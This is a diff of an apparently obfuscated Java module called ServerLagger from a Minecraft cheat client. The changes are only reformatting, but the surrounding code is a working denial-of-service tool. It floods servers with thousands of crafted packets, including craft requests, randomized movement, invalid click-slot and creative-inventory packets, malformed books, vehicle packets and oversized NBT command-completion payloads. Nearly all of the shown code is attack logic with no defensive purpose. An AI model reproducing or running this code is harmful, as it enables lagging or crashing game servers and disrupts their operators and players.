@@ -36,7 +36,7 @@ import java.util.stream.Collectors;
 import java.util.stream.IntStream;
 
 public class ServerLagger_xbIbOIunYFUorlZcLJkD
-extends Module_eSdgMXWuzcxgQVaJFmKZ {
+        extends Module_eSdgMXWuzcxgQVaJFmKZ {
     private final EnumSetting<Mode> mode = this.add(new EnumSetting<Mode>("Mode", Mode.Selector));
     private final SliderSetting offhandPackets = this.add(new SliderSetting("OPackets", 1000.0, 1.0, 10000.0, 1.0, v -> this.mode.getValue() == Mode.OffhandSpam));
     private final SliderSetting vehiclePackets = this.add(new SliderSetting("VPackets", 2000.0, 100.0, 10000.0, 1.0, v -> this.mode.getValue() == Mode.Vehicle || this.mode.getValue() == Mode.Boat));
@@ -74,7 +74,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
             return;
         }
         ++this.ticks;
-        if ((double)this.ticks <= this.delay.getValue()) {
+        if ((double) this.ticks <= this.delay.getValue()) {
             return;
         }
         this.ticks = 0;
@@ -88,15 +88,14 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                     for (RecipeResultCollection recipeResultCollection : recipeResultCollectionList) {
                         for (RecipeEntry recipe : recipeResultCollection.getRecipes(true)) {
                             int i = 0;
-                            while ((double)i < this.craftPackets.getValue()) {
+                            while ((double) i < this.craftPackets.getValue()) {
                                 mc.getNetworkHandler().sendPacket(new CraftRequestC2SPacket(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.currentScreenHandler.syncId, recipe, true));
                                 ++i;
                             }
                         }
                     }
                     break;
-                }
-                catch (Exception e) {
+                } catch (Exception e) {
                     CommandManager.sendChatMessage("\u00a74[!] " + e.getMessage());
                     e.printStackTrace();
                     if (!this.smartDisable.getValue()) break;
@@ -106,7 +105,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
             }
             case SequenceItem: {
                 int i = 0;
-                while ((double)i < this.sequencePackets.getValue()) {
+                while ((double) i < this.sequencePackets.getValue()) {
                     mc.getNetworkHandler().sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, -1));
                     ++i;
                 }
@@ -116,7 +115,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                 Vec3d pos = new Vec3d(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getX(), ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getY(), ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getZ());
                 BlockHitResult bhr = new BlockHitResult(pos, Direction.DOWN, BlockPos.ofFloored(pos), false);
                 int i = 0;
-                while ((double)i < this.sequencePackets.getValue()) {
+                while ((double) i < this.sequencePackets.getValue()) {
                     mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr, -1));
                     ++i;
                 }
@@ -129,14 +128,13 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                 try {
                     Vec3d current_pos = ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getPos();
                     int i = 0;
-                    while ((double)i < this.movementPackets.getValue()) {
-                        PlayerMoveC2SPacket.Full move_packet = new PlayerMoveC2SPacket.Full(current_pos.x + this.getDistributedRandom(1.0), current_pos.y + this.getDistributedRandom(1.0), current_pos.z + this.getDistributedRandom(1.0), (float)ServerLagger_xbIbOIunYFUorlZcLJkD.rndD(90.0), (float)ServerLagger_xbIbOIunYFUorlZcLJkD.rndD(180.0), true);
+                    while ((double) i < this.movementPackets.getValue()) {
+                        PlayerMoveC2SPacket.Full move_packet = new PlayerMoveC2SPacket.Full(current_pos.x + this.getDistributedRandom(1.0), current_pos.y + this.getDistributedRandom(1.0), current_pos.z + this.getDistributedRandom(1.0), (float) ServerLagger_xbIbOIunYFUorlZcLJkD.rndD(90.0), (float) ServerLagger_xbIbOIunYFUorlZcLJkD.rndD(180.0), true);
                         mc.getNetworkHandler().sendPacket(move_packet);
                         ++i;
                     }
                     break;
-                }
-                catch (Exception e) {
+                } catch (Exception e) {
                     CommandManager.sendChatMessage("\u00a74[!] " + e.getMessage());
                     e.printStackTrace();
                     if (!this.smartDisable.getValue()) break;
@@ -148,7 +146,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                 String overflow = this.generateJsonObject(this.length.getValueInt());
                 String partialCommand = "msg @a[nbt={PAYLOAD}]".replace("{PAYLOAD}", overflow);
                 int i = 0;
-                while ((double)i < this.commandPackets.getValue()) {
+                while ((double) i < this.commandPackets.getValue()) {
                     ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
                     ++i;
                 }
@@ -167,7 +165,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
             }
             case InteractNoCom: {
                 int i = 0;
-                while ((double)i < this.interactPackets.getValue()) {
+                while ((double) i < this.interactPackets.getValue()) {
                     Vec3d cpos = this.pickRandomPos();
                     mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(cpos, Direction.DOWN, BlockPos.ofFloored(cpos), false), 0));
                     ++i;
@@ -181,7 +179,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
             }
             case InteractItem: {
                 int i = 0;
-                while ((double)i < this.interactPackets.getValue()) {
+                while ((double) i < this.interactPackets.getValue()) {
                     mc.getNetworkHandler().sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, 0));
                     ++i;
                 }
@@ -191,7 +189,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                 Int2ObjectArrayMap<ItemStack> REAL = new Int2ObjectArrayMap<>();
                 REAL.put(0, new ItemStack(Items.RED_DYE, 1));
                 int i = 0;
-                while ((double)i < this.clickSlotPackets.getValue()) {
+                while ((double) i < this.clickSlotPackets.getValue()) {
                     mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.currentScreenHandler.syncId, 123344, 2957234, 2859623, SlotActionType.PICKUP, new ItemStack(Items.AIR, -1), REAL));
                     ++i;
                 }
@@ -224,7 +222,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
             case Book:
             case CreativeBook: {
                 int i = 0;
-                while ((double)i < this.bookPackets.getValue()) {
+                while ((double) i < this.bookPackets.getValue()) {
                     this.sendBadBook();
                     ++i;
                 }
@@ -249,7 +247,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                 tag.put("Pos", list);
                 the.setSubNbt("BlockEntityTag", tag);
                 int i = 0;
-                while ((double)i < this.creativePackets.getValue()) {
+                while ((double) i < this.creativePackets.getValue()) {
                     mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(1, the));
                     ++i;
                 }
@@ -267,7 +265,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                     this.disable();
                 }
                 int i = 0;
-                while ((double)i < this.vehiclePackets.getValue()) {
+                while ((double) i < this.vehiclePackets.getValue()) {
                     mc.getNetworkHandler().sendPacket(new BoatPaddleStateC2SPacket(true, true));
                     ++i;
                 }
@@ -282,10 +280,10 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                     return;
                 }
                 BlockPos start = ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getBlockPos();
-                Vec3d end = new Vec3d((double)start.getX() + 0.5, start.getY() + 1, (double)start.getZ() + 0.5);
+                Vec3d end = new Vec3d((double) start.getX() + 0.5, start.getY() + 1, (double) start.getZ() + 0.5);
                 vehicle.updatePosition(end.x, end.y - 1.0, end.z);
                 int i = 0;
-                while ((double)i < this.vehiclePackets.getValue()) {
+                while ((double) i < this.vehiclePackets.getValue()) {
                     mc.getNetworkHandler().sendPacket(new VehicleMoveC2SPacket(vehicle));
                     ++i;
                 }
@@ -293,7 +291,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
             }
             case OffhandSpam: {
                 int index = 0;
-                while ((double)index < this.offhandPackets.getValue()) {
+                while ((double) index < this.offhandPackets.getValue()) {
                     ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.networkHandler.sendPacket(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, BlockPos.ORIGIN, Direction.UP));
                     ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(true));
                     ++index;
